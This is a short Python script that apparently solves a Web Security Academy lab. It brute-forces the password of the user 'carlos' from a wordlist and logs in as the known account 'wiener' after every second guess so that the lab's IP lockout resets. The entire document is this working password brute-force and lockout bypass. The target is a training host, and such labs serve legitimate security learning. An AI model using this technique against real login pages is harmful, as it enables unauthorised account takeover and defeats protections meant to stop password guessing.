import requests

url = "https://0a950017049536f482dcf76e007b00ae.web-security-academy.net/login"

# Brute-force password
counter = 1
with open("passwords.txt", "r") as f:
    for line in f:
        password = line.strip()
        r = requests.post(url, data={"username": "carlos", "password": password})
        if "Incorrect password" not in r.text:
            break
        if counter % 2 == 0: # Log-in after two attempts
            requests.post(url, data={"username": "wiener", "password": "peter"})
        counter += 1
print(password)